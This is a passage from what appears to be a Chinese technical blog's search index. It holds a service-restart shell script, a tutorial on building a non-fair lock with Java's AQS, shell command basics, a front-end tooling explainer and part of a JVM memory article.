        <span class="token function">nohup</span> <span class="token function">node</span> server.js <span class="token operator">>></span> renre.log <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span>
        <span class="token keyword">fi</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$&#123;renren&#125;</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">]</span>
<span class="token keyword">then</span>
        <span class="token builtin class-name">cd</span> /project/qiyuan/java
        <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%F%n%T<span class="token variable">)</span></span>, server restart"</span> <span class="token operator">>></span> renren.log
        <span class="token function">nohup</span> <span class="token function">java</span> <span class="token parameter variable">-jar</span> renren-fast.jar <span class="token operator">>></span> renren.log <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span>
<span class="token keyword">fi</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$&#123;getaway&#125;</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">]</span>
<span class="token keyword">then</span>
        <span class="token builtin class-name">cd</span> /project/qiyuan/java
        <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%F%n%T<span class="token variable">)</span></span>, server restart"</span> <span class="token operator">>></span> getaway.log
        <span class="token function">nohup</span> <span class="token function">java</span> <span class="token parameter variable">-jar</span> getaway-0.0.1-SNAPSHOT.jar <span class="token operator">>></span> getaway.log <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span>
<span class="token keyword">fi</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$&#123;manager&#125;</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">]</span>
<span class="token keyword">then</span>
        <span class="token builtin class-name">cd</span> /project/qiyuan/java
        <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> +%F%n%T<span class="token variable">)</span></span>,node server restart"</span> <span class="token operator">>></span> manager.log
        <span class="token function">nohup</span> <span class="token function">java</span> <span class="token parameter variable">-jar</span> manager-0.0.1-SNAPSHOT.jar <span class="token operator">>></span> manager.log <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span>
<span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>手写非公平锁（ReentrantLock）</title>
    <url>//post/%E5%B9%B6%E5%8F%91/%E6%89%8B%E5%86%99%E9%9D%9E%E5%85%AC%E5%B9%B3%E9%94%81%EF%BC%88ReentrantLock%EF%BC%89.html</url>
    <content><![CDATA[<h1 id="手写非公平锁（ReentrantLock）"><a href="#手写非公平锁（ReentrantLock）" class="headerlink" title="手写非公平锁（ReentrantLock）"></a>手写非公平锁（ReentrantLock）</h1><p>​        ReentrantLock很多教程都在讲解，虽然很细致，但内容太多了，过段时间就很容易忘，我们知道ReentrantLock的核心是AQS(抽象队列同步器)，我们这里试着使用AQS，自己写一个非公平锁使用，看看AQS承载了哪部分的职责，ReentrantLock承载了哪部分的职责</p>
<blockquote>
<p>第一步：定义接口，面向接口编程嘛</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> myLock <span class="token punctuation">&#123;</span>
  	<span class="token comment">// 很简单的加锁和释放锁</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>第二步：看看ReentrantLock与AQS的关系</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> myUnFairLock <span class="token keyword">implements</span> myLock <span class="token punctuation">&#123;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Sync</span> sync <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sync</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  	<span class="token comment">// 锁的核心由AQS管理，ReentrantLock只负责重写 tryAcquire 和 tryRelease方法的逻辑</span>
  	<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Sync</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractQueuedSynchronizer</span> <span class="token punctuation">&#123;</span>
      	<span class="token annotation punctuation">@Override</span>
        <span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">tryAcquire</span><span class="token punctuation">(</span><span class="token keyword">int</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
       	<span class="token annotation punctuation">@Override</span>
        <span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">tryRelease</span><span class="token punctuation">(</span><span class="token keyword">int</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
      
      	<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          	<span class="token comment">// 这些方法AQS都已经封装好，我们只需要组合即可</span>
          	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">compareAndSetState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">setExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token function">acquire</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
      
      	<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
  
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        sync<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        sync<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>第三部：查看ReentrantLock重写的加锁，释放锁的步骤</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Sync</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractQueuedSynchronizer</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">tryAcquire</span><span class="token punctuation">(</span><span class="token keyword">int</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 获取当前线程</span>
        <span class="token keyword">final</span> <span class="token class-name">Thread</span> current <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 获取同步器的状态值(AQS初始好的),其实就是一个锁的引用计数器，为0时表示锁无人占有</span>
        <span class="token keyword">int</span> state <span class="token operator">=</span> <span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 说明state值是与锁状态有关的</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>state <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 0代表可以再次抢锁</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">compareAndSetState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// 如果抢到，指明当前线程，获取到锁了</span>
                <span class="token function">setExclusiveOwnerThread</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token comment">// 判断占有线程是否就是自己，保证锁的可重入性</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>current <span class="token operator">==</span> <span class="token function">getExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 如果是自己的锁，则计数器+1</span>
            <span class="token keyword">int</span> newState <span class="token operator">=</span> state <span class="token operator">+</span> arg<span class="token punctuation">;</span>
            <span class="token comment">// 这里是怕无限递归，造成计数器溢出</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>newState <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Maximum lock count exceeded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token comment">// 设置新的值</span>
            <span class="token function">setState</span><span class="token punctuation">(</span>newState<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">tryRelease</span><span class="token punctuation">(</span><span class="token keyword">int</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 获取锁的引用计数器</span>
        <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> arg<span class="token punctuation">;</span>
        <span class="token comment">// 判断清楚现在释放的锁是自己占用的锁不</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">getExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalMonitorStateException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">boolean</span> free <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 锁状态清0</span>
            free <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token function">setExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">setState</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 如果锁还有被引用，就是false，无引用就是true</span>
        <span class="token keyword">return</span> free<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">compareAndSetState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">setExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token function">acquire</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">release</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​        这些就是ReentrantLock核心做的事儿，其他的都交给AQS来完成，例如设置锁占有，获取锁值，通过原子比较尝试获取锁，阻塞线程的管理等。如果需要我们可以在中间加入我们的逻辑，来替代原有的ReentrantLock。</p>
]]></content>
      <categories>
        <category>手写系列</category>
      </categories>
      <tags>
        <tag>AQS锁</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell的常规使用</title>
    <url>//post/Linux/shell%E7%9A%84%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8.html</url>
    <content><![CDATA[<h2 id="shell的分类"><a href="#shell的分类" class="headerlink" title="shell的分类"></a>shell的分类</h2><ol>
<li>/bin/bash  是我们在linux或者Mac下常用的shell</li>
<li>zsh 是一种增强shell，在Mac和Linux中可使用，Mac基本自带</li>
</ol>
<h2 id="日常文件操作"><a href="#日常文件操作" class="headerlink" title="日常文件操作"></a>日常文件操作</h2><ul>
<li>ls   ：显示文件</li>
<li>cd  ：进入文件夹</li>
<li>cp  ：拷贝文件</li>
<li>mv  ：重命名或迁移文件</li>
<li>cat  ：查看文件内容，并在控制台打印</li>
<li>head：查看文件头部信息，可指定多少行</li>
<li>tail  ：查看文件尾部信息，可指定行数，并且可跟踪日志文件</li>
<li>grep：查找过滤，一般用在 <code>操作 | grep</code> ， | 表示管道符，将操作的返回的数据，通过grep进行过滤<ul>
<li>fgrep  ： 无正则查询，普通查询快</li>
<li>egrep ：有正则查看</li>
</ul>
</li>
</ul>
<h2 id="shell的快捷键"><a href="#shell的快捷键" class="headerlink" title="shell的快捷键"></a>shell的快捷键</h2><ul>
<li>↑ ↓ 会回显之前执行的代码。默认记录500条</li>
<li>ctrl + R , 快速查看之前执行的命令</li>
<li>ctrl + W，将已输入的命令，以空格划分，每次向前删除一部分</li>
<li>ctrl + U，删除已输入命令所有部分</li>
<li>ctrl + A，将光标移动到最前(已输入内容)</li>
<li>ctrl + E,   将光标移动到最后</li>
<li>ctrl + K，向右删除所有</li>
<li>ctrl + D，向右删除一位</li>
<li>ctrl + L / clear ，清空页面显示，但是可以向上查看</li>
<li>Command + K , reset , 删除页面显示内容</li>
</ul>
<h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><ul>
<li>ctrl + c 退出进程</li>
<li>ctrl + z 将当前进程在后台挂起</li>
<li>fg         将挂起进程再在页面显示，使用&amp;操作</li>
<li>kill -9 pid  删除进程，可能导致数据库脏数据</li>
<li>ps  查看进程状态</li>
<li>ps  aux  查看 所有进程信息</li>
<li>ps aux | grep ruby 查看Ruby进程信息</li>
</ul>
<h2 id="网络调用"><a href="#网络调用" class="headerlink" title="网络调用"></a>网络调用</h2><ul>
<li>ifconfig ： 网卡信息</li>
<li>netstat  ： 网络连接 ： netstat -an | grep LISTEN  查看开启的端口</li>
<li>dig        ： 查看域名对应的ip信息</li>
<li>curl       ： 模拟HTTP请求，查看请求头，请求体</li>
<li>wget     ： 从远程下载文件</li>
</ul>
<h2 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h2><ul>
<li>du 查看文件占用大小</li>
<li>df -h 显示磁盘大小，-h表示已人类友好显示  1024k  -  1m</li>
<li>chmod  修改文件权限</li>
<li>chown   修改文件所属</li>
</ul>
<h2 id="自定义命令"><a href="#自定义命令" class="headerlink" title="自定义命令"></a>自定义命令</h2><ul>
<li><code>vim ~/.profile</code>  在打开终端时会自动执行一遍，可定义函数，参数按照 $1,$2来获取，保存后，如果想在当前session生效，需要使用：<code>source ~/.profile</code></li>
<li>alias 将之前的命名重命名 ：alias la=”ls -a”</li>
<li>如果想在全局生效：需要修改环境变量配置：</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 我们在 ~/.profile 中定义或修改函数后，进入环境变量配置</span>
<span class="token function">vim</span> ~/.bash_profile 
<span class="token comment"># 加载 ~/.profile</span>
<span class="token builtin class-name">source</span> ~/.profile  
<span class="token comment"># 保存退出 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>前端问题解惑</title>
    <url>//post/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E9%97%AE%E9%A2%98%E8%A7%A3%E6%83%91.html</url>
    <content><![CDATA[<h1 id="前端问题解惑"><a href="#前端问题解惑" class="headerlink" title="前端问题解惑"></a>前端问题解惑</h1><p>​        如今前端发展的太快了，让我们这些只会基础<code>HTML + CSS + JS</code>的人无所适从，大量的组件，大量的工具，让人不知道到底干嘛的，所以这里写下最近的学习所得，强烈推荐资源：<a href="https://www.theodinproject.com/paths/full-stack-ruby-on-rails/courses/javascript">theodinproject</a> 和 <a href="https://peterxjang.com/blog/modern-javascript-explained-for-dinosaurs.html">modern-javascript-explained-for-dinosaurs</a>。</p>
<h2 id="前后端渲染"><a href="#前后端渲染" class="headerlink" title="前后端渲染"></a>前后端渲染</h2><h3 id="后端渲染"><a href="#后端渲染" class="headerlink" title="后端渲染"></a>后端渲染</h3><p>​        如果你用过Java编写过Web项目，应该听说过<code>Servlet 和 JSP</code>这玩意儿，Servlet可以处理HTTP请求并生成响应，JSP是简化版的Servlet，用户通过访问Servlet，获取服务端的HTML页面，通过JSP可以在HTML中嵌入Java的代码，比如条件判断，循环，数据访问等等，增强页面展示和动态性。你可能会疑惑，为什么那时候不用Js啊，因为那时候的Js只能做一些简单的动态效果，表单验证之类的功能。</p>
<img src="../../typora-user-images/image-20231121200249161.png" alt="image-20231121200249161" style="zoom:40%;" />


<p>​    一切看起来不错，但有一些问题存在：</p>
<ol>
<li>占用服务器资源多，所有计算在服务器完成。</li>
<li>每请求一次，都要从服务器上获取完整的HTML，比如我就想更新页面上一小部分，却需要下载整个页面（这里就引出了后面的<code>ajax</code>）。</li>
</ol>
<h3 id="前端渲染"><a href="#前端渲染" class="headerlink" title="前端渲染"></a>前端渲染</h3><p>​    现在我们很常见的前后端分离，将所有<code>JavaScript,css,HTML</code>等文件打包成一个或多个静态文件，通过<code>Nginx</code>进行访问，这里只有基本的HTML框架，再通过访问服务端接口获取数据，通过Js进行处理渲染。这就很方便的将页面展示与数据处理进行解耦。</p>
<img src="../../typora-user-images/image-20231121202213030.png" alt="image-20231121202213030" style="zoom:40%;" />

<p>优点：</p>
<ol>
<li>减轻了服务端的压力</li>
<li>提高了页面的响应速度</li>
<li>支持动态内容更新等等</li>
</ol>
<p>缺点：</p>
<ol>
<li>例如对SEO不够友好，SEO就是搜索引擎爬虫的优化，比如想让百度多一些我的网站链接，服务端渲染每次请求都有实际数据，并且加载快，而前端渲染就会有数据丢失，加载慢的问题。</li>
<li>首次访问时需要下载大量静态文件，这里引出后面的<code>webpack</code></li>
</ol>
<h2 id="JavaScript引入"><a href="#JavaScript引入" class="headerlink" title="JavaScript引入"></a>JavaScript引入</h2><h3 id="版本一：HTML-JS"><a href="#版本一：HTML-JS" class="headerlink" title="版本一：HTML+JS"></a>版本一：HTML+JS</h3><p>​        刚学习JavaScript时，我们都知道，可以直接在HTML中使用<code>script</code>标签进行使用，不过为了代码复用管理我们通过会写到<code>.js</code>文件中，然后在HTML中进行引用。并且假如有人写好了一个Js库，你可以下载源文件到本地，然后直接进行引用。这很简单直接。但有一些问题需要解决：</p>
<ol>
<li>引入顺序是有要求的，要不然依赖会出现问题</li>
<li>当有多个文件引入时，下载时间就会变长</li>
<li>如果第三方js文件更新，就需要手动下载最新的文件，进行替换（这里引出<code>npm</code>）</li>
</ol>
<h3 id="版本二：使用NPM"><a href="#版本二：使用NPM" class="headerlink" title="版本二：使用NPM"></a>版本二：使用NPM</h3><p>​        <a href="https://docs.npmjs.com/">npm</a>是JavaScript第三方包管理工具，就比如大家把自己写好的库发布到npm中，当你需要某个库时，你声明你要什么，通过npm进行下载，而不需要手动挨个寻找。下载下来的文件都会放到<code>node_modules</code>目录下，这样你在HTML引用JavaScript文件时，就到<code>node_modules</code>目录下寻找对应的位置。</p>
<h3 id="版本三：使用Webpack"><a href="#版本三：使用Webpack" class="headerlink" title="版本三：使用Webpack"></a>版本三：使用Webpack</h3><img src="../../typora-user-images/image-20231121210536176.png" alt="image-20231121210536176" style="zoom:50%;" />

<p>​        <a href="https://webpack.js.org/guides/getting-started/">webpack</a>是一个开源的JavaScript模块打包器，什么意思？上面我们讲的问题，当多个文件引入到HTML时，下载时长增加。文件引入顺序是有要求的，否则依赖错误，通过<code>webpack</code>就能解决这一问题。</p>
<p>​        Webpack可以根据模块的依赖关系自动创建模块之间的引用关系，通过打包将多个模块合并为一个或多个文件，同时通过分析依赖关系，将不用的代码剔除，尽量精简文件，以减少网络请求的数量和大小，这时候也就解决了依赖顺序，多文件下载的问题。</p>
<p>​        另外我们会发现一个奇怪的问题，我们经常见到一种语法：<code>import # from &#39;#&#39; </code>，但是当你自己尝试写到Js文件时，直接插到HTML中，你会看到浏览器控制条输出：<code>Cannot use import statement outside a module</code>,这是因为浏览器不支持<code>ES6</code>的语法，但是为啥Webpack转完能用了，就引出了<code>Babel</code></p>
<h3 id="版本四：使用Bable"><a href="#版本四：使用Bable" class="headerlink" title="版本四：使用Bable"></a>版本四：使用Bable</h3><p>​        引申上面的问题，这里就不得不提到：<code>ES6</code>, 简单地说，<code>ES6</code>是JavaScript的一个版本，它包含了许多新特性，使编写JavaScript更容易和更干净。但是浏览器并不一定支持这些新特性，所以我们经常听到浏览器兼容问题，就是因为一些浏览器并不支持该特性，导致代码执行错误，而一些浏览器支持，则能正常显示。你无法确定用户是从哪里进行访问的。而这个问题的一个解决方案就是<a href="http://babeljs.io/">Babel</a>，它可以将现代JavaScript代码转换为旧浏览器可以理解的代码。</p>
<p>​        我们都知道，不管你是用Vue，React，TypeScript最终浏览器能识别的就仅仅只有<code>HTML,CSS,JavaScript</code>，所以势必是有个玩意儿将这些框架语法进行转化了。这就很像我们常讲的编译二进制文件，因为电脑只能识别二进制，所以不管是C，Rust这些高级语言，最终都会被编译为二进制文件进行执行。这里也是同理的。</p>
<h2 id="辅助工具"><a href="#辅助工具" class="headerlink" title="辅助工具"></a>辅助工具</h2><h3 id="linting"><a href="#linting" class="headerlink" title="linting"></a>linting</h3><p>​        Linting是一种静态代码分析工具，主要用于检查代码的语法和规范是否符合某种编程语言的标准。它可以检测出代码中的潜在问题，如语法错误、未定义的变量等。常用的Linting工具有<a href="https://www.jslint.com/">JSLint</a>、<a href="https://eslint.org/">ESLint</a>等。</p>
<h3 id="Prettier"><a href="#Prettier" class="headerlink" title="Prettier"></a>Prettier</h3><p>​        Prettier则是一款代码美化工具，它可以将代码按照统一的编码规范进行格式化。它并没有强制性的检查功能，而是将代码格式调整为符合特定编码规范，如空格数量、缩进方式等。Prettier可以帮助保持代码的一致性和可读性。</p>
<p>​        </p>
<p>​        </p>
]]></content>
      <categories>
        <category>演化过程系列</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>内存划分与溢出</title>
    <url>//post/JVM/2_Java%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E4%B8%8E%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA%E5%BC%82%E5%B8%B8.html</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>​        对于java与C&amp;C++开发的一大区别就在内存管理方面。Java是通过虚拟机管理内存，但如果不熟悉虚拟机怎么使用管理内存，出现内存泄露和内存溢出问题，修正就会很艰难。</p>
<h1 id="运行时数据区域"><a href="#运行时数据区域" class="headerlink" title="运行时数据区域"></a>运行时数据区域</h1><p>​        Java虚拟机在执行Java程序的过程中会把所管理的内存划分为一个个小部分，有的部分随着进程的启动而一直存在，有的部分随着用户线程的启动和结束而创建和销毁。其管理的内存分为以下几个运行时数据区域。</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hec54446j31500ncn0t.jpg" alt="image-20220613084723714"></p>
<h2 id="程序计数器"><a href="#程序计数器" class="headerlink" title="程序计数器"></a>程序计数器</h2><p>​        是一块儿较小的内存空间，他可以看做是当前线程所执行的字节码的行号指示器，通俗的来讲就是通过改变计数器的值来选取下一条需要执行的字节码指令，它是程序控制流的指示器，分支，循环，跳转，异常处理，线程恢复等基础功能都是依赖计数器完成的。</p>
<p>​        在java多线程中，是利用线程轮流切换，分配处理器执行时间的方式来实现的，也就是说我执行了一会儿A线程，时间到了，我要去执行B线程了，那B线程执行时间到，我要再切换会A线程，那我怎么知道刚才任务完成到哪了？所以每个线程都私有一个程序计数器来保证线程切换后能回到正确的位置。</p>
<p>​        如果执行的是一个Java方法，则计数器记录的是正在执行的虚拟机字节码指令的地址，如果执行的是一个本地方法（native），这个计数器值则应为空（Undefined）。这里的内存区域是唯一在《Java虚拟机规范》中没有任何OutOfMemoryError情况的区域。</p>
<h2 id="Java虚拟机栈"><a href="#Java虚拟机栈" class="headerlink" title="Java虚拟机栈"></a>Java虚拟机栈</h2><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hef5tqq8j310e0k641a.jpg" alt="image-20220613091716081"></p>
<p>​        Java虚拟机栈也是线程私有的，他的生命周期与线程相同，每个方法被调用的时候，虚拟机栈就会同步创建一个栈帧来存储局部变量表，操作数栈，动态链接，方法出口等信息，每个方法的调用与执行结束都对应这栈帧的入栈与出栈。</p>
<p>​        其中局部变量表存放编译器可知的各种虚拟机基本数据类型（int，char），对应引用（Object），returnAddress（指向一条字节码指令地址）。局部变量表需要多大的空间在编译期间就可以确定的。也就是变量槽数量是不变了的。</p>
<p>​        这里存在两种异常情况：</p>
<ol>
<li>栈溢出（StackOverflowError），一般我们在递归算法中如果无限调用方法就会爆出该错误</li>
<li>内存溢出（OutOfMemoryError），如果设置栈可以动态扩展空间，当栈无法申请到更多的空间就会爆出OOM内存溢出。</li>
</ol>
